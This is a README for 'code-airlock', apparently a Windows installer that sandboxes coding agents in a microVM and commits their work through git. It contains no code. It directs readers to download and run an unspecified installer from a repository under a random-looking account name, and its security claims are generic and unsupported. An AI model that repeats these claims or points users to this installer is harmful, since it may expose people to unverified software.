# 🛡️ code-airlock - Run coding agents in safe spaces

[![](https://img.shields.io/badge/Download-code-airlock-blue.svg)](https://github.com/Screwnephropsnorvegicus769/code-airlock)

code-airlock keeps your main computer separate from your coding agent. It creates a small, temporary computer inside your machine. The agent does its work inside this digital room. When the agent finishes, it saves the changes to your folder using git. You keep full control over every change.

## ⚙️ Why use this tool

Computer security is important. When you run a coding agent, it can make changes to files across your system. code-airlock removes this risk. It creates a virtual machine for the task. This machine has no access to your personal files or sensitive data. It only sees the folder you share with it. Once the task ends, the tool deletes the virtual machine. Your work remains safe in your git repository.

## 💻 System Requirements

You need a Windows computer to run this tool. Ensure you have the following installed:

*   Windows 10 or 11 (64-bit).
*   At least 8 GB of RAM.
*   Virtualization enabled in your BIOS settings.
*   Git installed on your system.

## 📥 Installation Steps

Follow these steps to set up the software on your machine:

1. Visit [this page](https://github.com/Screwnephropsnorvegicus769/code-airlock) to download the installer.
2. Open the downloaded file.
3. Follow the instructions on the screen.
4. Restart your computer if the installer asks you to finish the setup.

## 🚀 How to run the agent

Once you install the tool, you can start a session:

1. Open the code-airlock application from your Start menu.
2. Choose the folder where you keep your project files.
3. Press the Start button.
4. The tool builds a secure area. This takes a moment.
5. The agent starts its work inside the window.
6. Watch the progress in the console.

## 📝 Managing your changes

code-airlock uses git to track work. When the agent acts, it commits changes to your project. This allows you to inspect every change before you accept them.

1. Open your project folder after the agent finishes.
2. Use a program to view your git history.
3. Review the files the agent changed.
4. You can keep the changes or discard them if they do not suit your needs.

## 🛡️ Keeping your data safe

The microVM approach provides a layer of isolation. The agent cannot reach your web browser passwords, documents, or system settings. It lives inside an airtight container. The container vanishes when the agent job finishes. You control the scope of the agent by choosing the specific folder you share.

## 🔧 Troubleshooting common problems

Sometimes the tool fails to start. Check these items:

*   Does your computer support virtualization? Open Task Manager, click Performance, and look for Virtualization: Enabled.
*   Is your version of Windows fully updated? Run Windows Update to get the latest patches. 
*   Did you install Git? Type `git --version` in your command prompt to verify.

If you continue to face issues, check the logs located in the installation folder. These text files explain why the tool failed. 

## 🌐 Settings and configuration

You can change how the agent runs by editing the settings file. You can adjust:

*   The amount of memory assigned to the agent.
*   The default coding agent you want to use.
*   The network restrictions for the virtual machine.

Keep these settings at their default values unless you have specific needs for your workflow.

## 📋 Best practices

*   Always keep your project files inside a git repository.
*   Run the agent on small tasks at first. 
*   Check the git history after every session.
*   Update the code-airlock tool regularly to receive security improvements.

Keywords: ai-agents, claude-code, codex, coding-agent, devtools, docker, docker-sandboxes, microvm, opencode, sandbox